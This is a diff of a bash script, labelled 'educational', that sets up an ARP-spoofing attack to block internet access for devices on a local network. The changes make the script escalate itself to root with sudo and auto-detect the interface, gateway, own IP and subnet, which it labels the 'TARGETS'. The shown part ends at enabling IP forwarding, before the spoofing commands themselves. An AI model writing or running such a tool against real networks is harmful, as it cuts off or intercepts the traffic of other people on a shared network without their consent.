@@ -1,33 +1,49 @@
 #!/bin/bash
 
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
-# Requires: arpspoof, iptables, ipcalc, and root privileges
+# Requires: arpspoof, iptables, ipcalc, and root privilege
+
+# Check if script is running as root
+if [[ $EUID -ne 0 ]]; then
+    exec sudo "$0" "$@"
+fi
+
+# Current Network Config
+WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
+GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
+MASK=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
+IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
+
+echo "INTERFACE: | $WLAN"
+echo "GATEWAY:   | $GW"
+echo "MYIP:      | $IP"
+echo "TARGETS:   | $MASK"
+echo ""
 
 # Detect Interface
-WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
-echo "Enter Wireless Interface: Enter by default"
+echo "Enter Wireless Interface: Skip for default"
 read -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
+echo ""
 
 # Detect Gateway IP
-GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
-echo "Enter Router Gateway IP: Enter by default"
+echo "Enter Router Gateway IP: Skip for default"
 read -p "> $GW" INET
 GATEWAY="${INET:-$GW}"
+echo ""
 
 # Detect Subnet
-MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
-echo "Enter Subnet mask: Enter by default"
+echo "Enter Subnet mask: Skip for default"
 read -p "> $MASK" IPS
 TARGET_IPS="${IPS:-$MASK}"
+echo ""
 
 # Detect Device IP
-echo "Enter Device IP: Enter by default"
-IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
+echo "Enter Device IP: Skip for default"
 read -p "> $IP" DEVIP
 MYIP="${DEVIP:-$IP}"
-
 echo ""
+
 # Prompt configuration
 echo "Your Arpspoof Configurations..."
 echo ""
@@ -35,6 +51,7 @@ echo "INTERFACE: | $INTERFACE"
 echo "GATEWAY:   | $GATEWAY"
 echo "MYIP:      | $MYIP"
 echo "TARGETS:   | $TARGET_IPS"
+echo ""
 
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
